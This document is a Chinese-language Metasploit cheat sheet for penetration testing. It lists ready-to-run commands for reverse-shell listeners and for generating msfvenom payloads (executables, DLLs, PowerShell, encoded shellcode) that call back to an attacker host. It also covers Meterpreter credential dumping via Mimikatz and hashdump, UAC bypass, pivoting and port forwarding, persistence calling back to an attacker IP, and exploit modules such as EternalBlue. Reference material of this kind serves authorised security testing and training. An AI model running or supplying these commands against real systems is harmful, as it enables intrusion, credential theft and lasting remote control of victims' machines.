# Metasploit 速查手册

---

## 基础命令

```bash
# 启动
msfconsole -q                              # 静默启动
msfconsole -r script.rc                    # 加载资源脚本

# 核心命令
search <keyword>                           # 搜索模块
use <module>                               # 使用模块
info                                       # 模块详情
show options                               # 当前模块参数
show payloads                              # 可用payload
show targets                               # 可用目标
back                                       # 返回
exit                                       # 退出
```

## Handler 监听

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <port>
set ExitOnSession false                    # 多个session不断开
exploit -j                                 # 后台运行
```

## Meterpreter 命令

```bash
# === Shell ===
shell                                      # 进入系统Shell
background                                 # 后台session

# === 信息收集 ===
sysinfo                                    # 系统信息
ps                                         # 进程列表
getuid                                     # 当前用户
ipconfig / ifconfig                        # 网络
route                                      # 路由表
netstat                                    # 网络连接

# === 文件操作 ===
ls / cd / pwd / cat / download / upload
search -f *.txt                            # 搜索文件

# === 提权 ===
getsystem                                  # 尝试自动提权
bypassuac                                  # UAC绕过

# === 凭据 ===
load kiwi                                  # 加载Mimikatz
kiwi_cmd sekurlsa::logonpasswords          # dump密码
hashdump                                   # SAM hash

# === 跳板与路由 ===
run autoroute -s 192.168.1.0/24            # 添加内网路由
run post/multi/manage/autoroute            # 自动添加

# === 端口转发 ===
portfwd add -L 0.0.0.0 -l 4445 -r 192.168.1.10 -p 445    # 本地→内网
portfwd list
portfwd delete -l 4445

# === Socks代理 ===
use auxiliary/server/socks_proxy
set VERSION 5
run -j

# === 持久化 ===
run persistence -U -i 60 -p <port> -r <attacker_ip>
run scheduleme -m 1 -e /tmp/shell.exe      # 计划任务
```

## MSFvenom (Payload生成)

```bash
# === 列出 ===
msfvenom -l payloads | grep windows
msfvenom -l encoders
msfvenom -l formats

# === Windows ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o met.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f psh-reflection -o shell.ps1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f csharp

# === Linux ===
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

# === 编码 ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# === 独立Shellcode ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o sc.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f c          # C数组
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python     # Python
```

## 常用模块

```bash
# === 扫描 ===
auxiliary/scanner/portscan/tcp              # TCP端口扫描
auxiliary/scanner/smb/smb_version           # SMB版本
auxiliary/scanner/http/dir_scanner          # HTTP目录
auxiliary/scanner/rdp/rdp_scanner           # RDP扫描

# === 漏洞利用 ===
exploit/windows/smb/ms17_010_eternalblue    # ★ MS17-010
exploit/multi/http/struts2_code_exec        # Struts2
exploit/multi/http/tomcat_mgr_upload        # Tomcat Manager
exploit/linux/http/ghostscript_ssti         # Ghostscript

# === 后渗透 ===
post/multi/recon/local_exploit_suggester    # 提权建议
post/windows/gather/enum_domain             # 域信息
post/windows/gather/credentials/mssql       # MSSQL凭据
```

## Meterpreter Session 管理

```bash
sessions -l                                 # 列session
sessions -i <id>                            # 交互
sessions -k <id>                            # 关闭
sessions -u <id>                            # 升级到Meterpreter
```

---

*参考: Metasploit Wiki + OffSec*
